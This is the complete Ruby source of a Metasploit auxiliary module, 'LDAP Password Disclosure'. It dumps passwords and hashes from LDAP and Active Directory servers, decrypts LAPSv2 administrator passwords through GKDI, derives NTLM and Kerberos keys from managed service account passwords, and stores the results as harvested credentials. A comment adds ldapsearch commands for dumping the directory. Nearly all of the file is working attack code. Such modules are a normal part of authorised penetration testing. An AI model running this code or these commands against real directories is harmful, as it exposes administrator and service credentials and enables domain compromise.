##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rasn1'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::MsGkdi
  include Msf::Exploit::Remote::LDAP
  include Msf::Exploit::Remote::LDAP::ActiveDirectory
  include Msf::Exploit::Remote::LDAP::Queries
  include Msf::OptionalSession::LDAP
  include Msf::Util::WindowsCryptoHelpers

  include Msf::Exploit::Deprecated
  moved_from 'auxiliary/gather/ldap_hashdump'

  LDAP_CAP_ACTIVE_DIRECTORY_OID = '1.2.840.113556.1.4.800'.freeze
  PASSWORD_ATTRIBUTES = %w[clearpassword mailuserpassword msds-managedpassword mslaps-password mslaps-encryptedpassword ms-mcs-admpwd password passwordhistory pwdhistory sambalmpassword sambantpassword userpassword userpkcs12]

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LDAP Password Disclosure',
        'Description' => %q{
          This module will gather passwords and password hashes from a target LDAP server via multiple techniques
          including Windows LAPS. For best results, run with SSL because some attributes are only readable over
          encrypted connections.
        },
        'Author' => [
          'Spencer McIntyre', # LAPS updates
          'Thomas Seigneuret', # LAPS research
          'Tyler Booth', # LAPS research
          'Hynek Petrak' # Discovery, module
        ],
        'References' => [
          ['URL', 'https://blog.xpnsec.com/lapsv2-internals/'],
          ['URL', 'https://github.com/fortra/impacket/blob/master/examples/GetLAPSPassword.py']
        ],
        'DisclosureDate' => '2020-07-23',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [],
          'AKA' => ['GetLAPSPassword']
        }
      )
    )

    register_options([
      OptInt.new('READ_TIMEOUT', [false, 'LDAP read timeout in seconds', 600]),
      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
      OptString.new('USER_ATTR', [false, 'LDAP attribute, that contains username', '']),
      OptString.new('PASS_ATTR', [
        false, 'Additional LDAP attribute(s) that contain passwords and password hashes',
        ''
        # Other potential candidates:
        # ipanthash, krbpwdhistory, krbmkey, unixUserPassword, krbprincipalkey, radiustunnelpassword, sambapasswordhistory
      ])
    ])
  end

  def session?
    defined?(:session) && session
  end

  # PoC using ldapsearch(1):
  #
  # Retrieve root DSE with base DN:
  #   ldapsearch -xb "" -s base -H ldap://[redacted]
  #
  # Dump data using discovered base DN:
  #   ldapsearch -xb bind_dn -H ldap://[redacted] \* + -
  def run_host(_ip)
    @read_timeout = datastore['READ_TIMEOUT'] || 600

    entries_returned = 0

    ldap_connect do |ldap|
      validate_bind_success!(ldap)

      if datastore['BASE_DN'].blank?
        fail_with(Failure::UnexpectedReply, "Couldn't discover base DN!") unless ldap.base_dn
        base_dn = ldap.base_dn
        print_status("Discovered base DN: #{base_dn}")
      else
        base_dn = datastore['BASE_DN']
      end

      if datastore['USER_ATTR'].present?
        vprint_status("Using the '#{datastore['USER_ATTR']}' attribute as the username")
      end

      vprint_status('Checking if the target LDAP server is an Active Directory Domain Controller...')
      if is_active_directory?(ldap)
        print_status('The target LDAP server is an Active Directory Domain Controller.')
        @ad_ds_domain_info = adds_get_domain_info(ldap)
      else
        print_status('The target LDAP server is not an Active Directory Domain Controller.')
        @ad_ds_domain_info = nil
      end

      print_status("Searching base DN: #{base_dn}")
      entries_returned += ldap_search(ldap, base_dn, base: base_dn)
      unless @ad_ds_domain_info.nil?
        attributes = %w[dn sAMAccountName msDS-ManagedPassword]
        attributes << datastore['USER_ATTR'] unless datastore['USER_ATTR'].blank? || attributes.include?(datastore['USER_ATTR'])
        entries_returned += ldap_search(ldap, base_dn, base: base_dn, filter: '(objectClass=msDS-GroupManagedServiceAccount)', attributes: attributes)
      end
    end

    # Safe if server did not return anything
    unless (entries_returned > 0)
      fail_with(Failure::NotVulnerable, 'Server did not return any data, seems to be safe')
    end
  rescue Timeout::Error
    fail_with(Failure::TimeoutExpired, 'The timeout expired while searching directory')
  rescue Net::LDAP::PDU::Error, Net::BER::BerError, Net::LDAP::Error, NoMethodError => e
    fail_with(Failure::UnexpectedReply, "Exception occurred: #{e.class}: #{e.message}")
  end

  def ldap_search(ldap, base_dn, args)
    entries_returned = 0
    creds_found = 0
    def_args = {
      return_result: false,
      scope: Net::LDAP::SearchScope_WholeSubtree,
      # build a filter that searches for any object that contains at least one of the attributes we're interested in
      filter: "(|#{password_attributes.map { "(#{_1}=*)" }.join})"
    }

    begin
      # HACK: fix lack of read/write timeout in Net::LDAP
      Timeout.timeout(@read_timeout) do
        ldap.search(def_args.merge(args)) do |entry|
          entries_returned += 1
          password_attributes.each do |attr|
            if entry[attr].any?
              creds_found += process_hash(entry, attr)
            end
          end
        end
      end
    rescue Timeout::Error
      print_error("Host timeout reached while searching '#{base_dn}'")
      return entries_returned
    ensure
      if entries_returned > 0
        print_status("Found #{entries_returned} entries and #{creds_found} credentials in '#{base_dn}'.")
      elsif ldap.get_operation_result.code == 0
        print_error("No entries returned for '#{base_dn}'.")
      end
    end

    entries_returned
  end

  def password_attributes
    attributes = PASSWORD_ATTRIBUTES.dup
    if datastore['PASS_ATTR'].present?
      attributes += datastore['PASS_ATTR'].split(/[,\s]+/).compact.reject(&:empty?).map(&:downcase)
      attributes.uniq!
    end

    attributes
  end

  def decode_pwdhistory(hash)
    # https://ldapwiki.com/wiki/PwdHistory
    parts = hash.split('#', 4)
    unless parts.length == 4
      return hash
    end

    hash = parts.last
    unless hash.starts_with?('{')
      decoded = Base64.decode64(hash)
      if decoded.starts_with?('{') || (decoded =~ /[^[:print:]]/).nil?
        return decoded
      end
    end
    hash
  end

  def process_hash(entry, attr)
    creds_found = 0
    username = [datastore['USER_ATTR'], 'sAMAccountName', 'uid', 'dn'].map { entry[_1] }.reject(&:blank?).first.first

    entry[attr].each do |private_data|
      if attr == 'pwdhistory'
        private_data = decode_pwdhistory(private_data)
      end

      # 20170619183528ZHASHVALUE
      if attr == 'passwordhistory' && private_data.start_with?(/\d{14}Z/i)
        private_data.slice!(/\d{14}Z/i)
      end

      # Cases *[crypt}, !{crypt} ...
      private_data.gsub!(/.?{crypt}/i, '{crypt}')

      # We observe some servers base64 encode the hash string
      # and add {crypt} prefix to the base64 encoded value
      # e2NyeXB0f in base64 means {crypt, e3NtZD is {smd
      if private_data.starts_with?(/{crypt}(e2NyeXB0f|e3NtZD)/)
        begin
          private_data = Base64.strict_decode64(private_data.delete_prefix('{crypt}'))
        rescue ArgumentError
          nil
        end
      end

      # Some have new lines at the end
      private_data.chomp!

      # Skip empty or invalid hashes, e.g. '{CRYPT}x', xxxx, ****
      next if private_data.blank?
      next if private_data.start_with?(/{crypt}/i) && private_data.length < 10
      next if private_data.start_with?('*****') || private_data == '*'
      next if private_data.start_with?(/xxxxx/i, /yyyyyy/i)
      next if private_data.end_with?('*LK*', '*NP*') # account locked, or never set
      next if private_data =~ /{sasl}/i # reject {SASL} pass-through

      if attr =~ /^samba(lm|nt)password$/
        next if private_data.length != 32
        next if private_data.case_cmp?('aad3b435b51404eeaad3b435b51404ee') || private_data.case_cmp?('31d6cfe0d16ae931b73c59d7e0c089c0')
      end

      # observed sambapassword history with either 56 or 64 zeros
      next if attr == 'sambapasswordhistory' && private_data =~ /^(0{64}|0{56})$/

      jtr_format = nil
      annotation = ''

      case attr
      when 'sambalmpassword'
        jtr_format = 'lm'
      when 'sambantpassword'
        jtr_format = 'nt'
      when 'sambapasswordhistory'
        # 795471346779677A336879366B654870 1F18DC5E346FDA5E335D9AE207C82CC9
        # where the left part is a salt and the right part is MD5(Salt+NTHash)
        # attribute value may contain multiple concatenated history entries
        # for john sort of 'md5($s.md4(unicode($p)))' - not tested
        jtr_format = 'sambapasswordhistory'
      when 'krbprincipalkey'
        jtr_format = 'krbprincipal'
        # TODO: krbprincipalkey is asn.1 encoded string. In case of vmware vcenter 6.7
        # it contains user password encrypted with (23) rc4-hmac and (18) aes256-cts-hmac-sha1-96:
        # https://github.com/vmware/lightwave/blob/d50d41edd1d9cb59e7b7cc1ad284b9e46bfa703d/vmdir/server/common/krbsrvutil.c#L480-L558
        # Salted with principal name:
        # https://github.com/vmware/lightwave/blob/c4ad5a67eedfefe683357bc53e08836170528383/vmdir/thirdparty/heimdal/krb5-crypto/salt.c#L133-L175
        # In the meantime, dump the base64 encoded value.
        private_data = Base64.strict_encode64(private_data)
      when 'ms-mcs-admpwd'
        # LAPSv1 doesn't store the name of the local administrator anywhere in LDAP. It's technically configurable via Group Policy, but we'll  assume it's 'Administrator'.
        username = 'Administrator'
        annotation = "(expires: #{convert_nt_timestamp_to_time_string(entry['ms-mcs-admpwdexpirationtime'].first.to_i)})" if entry['ms-mcs-admpwdexpirationtime'].present?
      when 'msds-managedpassword'
        managed_password = MsdsManagedpasswordBlob.read(private_data)
        current_password = managed_password.buffer_fields[:current_password] # this field should always be present
        if current_password && (domain_dns_name = @ad_ds_domain_info&.fetch(:dns_name))
          sam_account_name = entry[:sAMAccountName].first.to_s
          salt = "#{domain_dns_name.upcase}host#{sam_account_name.delete_suffix('$').downcase}.#{domain_dns_name.downcase}"
          encoded_current_password = current_password.force_encoding('UTF-16LE').encode('UTF-8', invalid: :replace, undef: :replace).force_encoding('ASCII-8BIT')

          ntlm_hash = OpenSSL::Digest::MD4.digest(current_password)
          ntlm_hash = "#{sam_account_name}:2105:aad3b435b51404eeaad3b435b51404ee:#{ntlm_hash.unpack1('H*')}:::"
          aes256_key = aes256_cts_hmac_sha1_96(encoded_current_password, salt)
          aes256_key = "#{domain_dns_name}\\#{sam_account_name}:aes256-cts-hmac-sha1-96:#{aes256_key.unpack1('H*')}"
          aes128_key = aes128_cts_hmac_sha1_96(encoded_current_password, salt)
          aes128_key = "#{domain_dns_name}\\#{sam_account_name}:aes128-cts-hmac-sha1-96:#{aes128_key.unpack1('H*')}"
          des_key = des_cbc_md5(encoded_current_password, salt)
          des_key = "#{domain_dns_name}\\#{sam_account_name}:des-cbc-md5:#{des_key.unpack1('H*')}"

          print_good(ntlm_hash)
          print_good(aes256_key)
          print_good(aes128_key)
          print_good(des_key)
          private_data = 'see above'
        end
      when 'mslaps-password'
        begin
          lapsv2 = JSON.parse(private_data)
        rescue StandardError => e
          elog("Encountered an error while parsing LAPSv2 plain-text data for user '#{username}'.", error: e)
          print_error("Encountered an error while parsing LAPSv2 plain-text data for user '#{username}'.")
          next
        end

        username = lapsv2['n']
        private_data = lapsv2['p']
        annotation = "(expires: #{convert_nt_timestamp_to_time_string(entry['mslaps-passwordexpirationtime'].first.to_i)})" if entry['mslaps-passwordexpirationtime'].present?
      when 'mslaps-encryptedpassword'
        lapsv2 = process_result_lapsv2_encrypted(entry)
        next if lapsv2.nil?

        username = lapsv2['n']
        private_data = lapsv2['p']
        annotation = "(expires: #{convert_nt_timestamp_to_time_string(entry['mslaps-passwordexpirationtime'].first.to_i)})" if entry['mslaps-passwordexpirationtime'].present?
      when 'userpkcs12'
        # if we get non printable chars, encode into base64
        if (private_data =~ /[^[:print:]]/).nil?
          jtr_format = 'pkcs12'
        else
          jtr_format = 'pkcs12-base64'
          private_data = Base64.strict_encode64(private_data)
        end
      else
        if private_data.start_with?(/{crypt}.?\$1\$/i)
          private_data.gsub!(/{crypt}.{,2}\$1\$/i, '$1$')
          jtr_format = 'md5crypt'
        elsif private_data.start_with?(/{crypt}/i) && private_data.length == 20
          # handle {crypt}traditional_crypt case, i.e. explicitly set the hash format
          private_data.slice!(/{crypt}/i)
          # FIXME: what is the right jtr_hash - des,crypt or descrypt ?
          # identify_hash returns des,crypt, while JtR acceppts descrypt
          jtr_format = 'descrypt'
        # TODO: not sure if we shall slice the prefixes here or in the JtR/Hashcat formatter
        # elsif hash.start_with?(/{sha256}/i)
        #  hash.slice!(/{sha256}/i)
        #  hash_format = 'raw-sha256'
        else
          # handle vcenter vmdir binary hash format
          if private_data[0].ord == 1 && private_data.length == 81
            _type, private_data, salt = private_data.unpack('CH128H32')
            private_data = "$dynamic_82$#{private_data}$HEX$#{salt}"
          else
            # Remove LDAP's {crypt} prefix from known hash types
            private_data.gsub!(/{crypt}.{,2}(\$[0256][aby]?\$)/i, '\1')
          end
          jtr_format = Metasploit::Framework::Hashes.identify_hash(private_data)
        end
      end

      # highlight unresolved hashes
      jtr_format = '{crypt}' if private_data =~ /{crypt}/i
      print_good("Credentials (#{jtr_format.blank? ? 'password' : jtr_format}) found in #{attr}: #{username}:#{private_data} #{annotation}")

      report_creds(username, private_data, jtr_format)
      creds_found += 1
    end

    creds_found
  end

  def report_creds(username, private_data, jtr_format)
    # this is the service the credentials came from, not necessarily where they can be used
    service_data = {
      address: rhost,
      port: rport,
      service_name: 'ldap',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      status: Metasploit::Model::Login::Status::UNTRIED,
      private_data: private_data,
      private_type: (jtr_format.nil? ? :password : :nonreplayable_hash),
      jtr_format: jtr_format,
      username: username
    }.merge(service_data)

    if @ad_ds_domain_info
      credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
      credential_data[:realm_value] = @ad_ds_domain_info[:dns_name]
    end

    cl = create_credential_and_login(credential_data)
    cl.respond_to?(:core_id) ? cl.core_id : nil
  end

  def process_result_lapsv2_encrypted(result)
    if session?
      print_warning('Can not obtain LAPSv2 decryption keys when running with an existing session.')
      return
    end

    encrypted_block = result['msLAPS-EncryptedPassword'].first

    encrypted_blob = LAPSv2EncryptedPasswordBlob.read(encrypted_block)
    content_info = Rex::Proto::CryptoAsn1::Cms::ContentInfo.parse(encrypted_blob.buffer.pack('C*'))
    encrypted_data = encrypted_blob.buffer[content_info.to_der.bytesize...].pack('C*')
    enveloped_data = content_info.enveloped_data
    recipient_info = enveloped_data[:recipient_infos][0]
    kek_identifier = recipient_info[:kekri][:kekid]

    key_identifier = kek_identifier[:key_identifier]
    key_identifier = GkdiGroupKeyIdentifier.read(key_identifier.value)

    other_key_attribute = kek_identifier[:other]
    unless other_key_attribute[:key_attr_id].value == '1.3.6.1.4.1.311.74.1'
      vprint_error('msLAPS-EncryptedPassword parsing failed: Unexpected OtherKeyAttribute#key_attr_id OID.')
      return
    end

    ms_key_attribute = MicrosoftKeyAttribute.parse(other_key_attribute[:key_attr].value)
    kv_pairs = ms_key_attribute[:content][:content][:content][:kv_pairs]
    sid = kv_pairs.value.find { |kv_pair| kv_pair[:name].value == 'SID' }[:value]&.value

    sd = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.from_sddl_text(
      "O:SYG:SYD:(A;;CCDC;;;#{sid})(A;;DC;;;WD)",
      domain_sid: sid.rpartition('-').first
    )

    if @gkdi_client.nil?
      @gkdi_client = connect_gkdi(username: datastore['LDAPUsername'], password: datastore['LDAPPassword'])
    end

    begin
      kek = gkdi_get_kek(
        client: @gkdi_client,
        security_descriptor: sd,
        key_identifier: key_identifier
      )
    rescue StandardError => e
      elog('Failed to obtain the KEK from GKDI', error: e)
      print_error("Failed to obtain the KEK from GKDI: #{e.class} - #{e}")
      return nil
    end

    algorithm_identifier = content_info.enveloped_data[:encrypted_content_info][:content_encryption_algorithm]
    algorithm_oid = Rex::Proto::CryptoAsn1::ObjectId.new(algorithm_identifier[:algorithm].value)
    unless [Rex::Proto::CryptoAsn1::OIDs::OID_AES256_GCM, Rex::Proto::CryptoAsn1::OIDs::OID_AES256_GCM].include?(algorithm_oid)
      vprint_error("msLAPS-EncryptedPassword parsing failed: Unexpected algorithm OID '#{algorithm_oid.value}'.")
      return
    end

    iv = algorithm_identifier.gcm_parameters[:aes_nonce].value
    encrypted_key = recipient_info[:kekri][:encrypted_key].value

    key = Rex::Crypto::KeyWrap::NIST_SP_800_38f.aes_unwrap(kek, encrypted_key)

    cipher = OpenSSL::Cipher::AES.new(key.length * 8, :GCM)
    cipher.decrypt
    cipher.key = key
    cipher.iv_len = iv.length
    cipher.iv = iv
    cipher.auth_tag = encrypted_data[-16...]
    plaintext = cipher.update(encrypted_data[...-16]) + cipher.final
    JSON.parse(RubySMB::Field::Stringz16.read(plaintext).value)
  end

  # https://blog.xpnsec.com/lapsv2-internals/#:~:text=msLAPS%2DEncryptedPassword%20attribute
  # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/b6ea7b78-64da-48d3-87cb-2cff378e4597
  class LAPSv2EncryptedPasswordBlob < BinData::Record
    endian :little

    file_time   :timestamp
    uint32      :buffer_size
    uint32      :flags
    uint8_array :buffer, initial_length: :buffer_size
  end

  class MicrosoftKeyAttribute < RASN1::Model
    class Sequence < RASN1::Model
      class KVPairs < RASN1::Model
        sequence :content, content: [
          utf8_string(:name),
          utf8_string(:value)
        ]
      end

      sequence :content, constructed: true, content: [
        sequence_of(:kv_pairs, KVPairs)
      ]
    end

    sequence :content, content: [
      objectid(:key_attr_id),
      model(:key_attr, Sequence)
    ]
  end

  # this is a partial implementation, processing the buffer and the fields is simplified to only support reading
  # see: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e
  class MsdsManagedpasswordBlob < BinData::Record
    endian :little
    hide   :reserved

    uint16 :version
    uint16 :reserved
    uint32 :blob_length
    uint16 :current_password_offset
    uint16 :previous_password_offset
    uint16 :query_password_interval_offset
    uint16 :unchanged_password_interval_offset

    count_bytes_remaining :bytes_remaining
    string :buffer, read_length: -> { bytes_remaining }

    def buffer_fields
      boffset = offset_of(buffer)
      bfield_offsets = {
        current_password: current_password_offset,
        previous_password: previous_password_offset,
        query_password_interval: query_password_interval_offset,
        unchanged_password_interval: unchanged_password_interval_offset
      }.sort_by { |_field, offset| offset }

      bfields = {}
      bfield_offsets.each_cons(2) do |(field, offset), (_, next_offset)|
        next if offset == 0

        bfields[field] = buffer[(offset - boffset)..(next_offset - boffset)]
      end
      last_field, last_offset = bfield_offsets.last
      bfields[last_field] = buffer[(last_offset - boffset)..] if last_offset != 0

      bfields[:current_password] = bfields[:current_password].split("\x00\x00".b).first if bfields[:current_password]
      bfields[:previous_password] = bfields[:previous_password].split("\x00\x00".b).first if bfields[:previous_password]
      bfields[:query_password_interval] = bfields[:query_password_interval].unpack1('Q<') if bfields[:query_password_interval]
      bfields[:unchanged_password_interval] = bfields[:unchanged_password_interval].unpack1('Q<') if bfields[:unchanged_password_interval]
      bfields
    end
  end
end
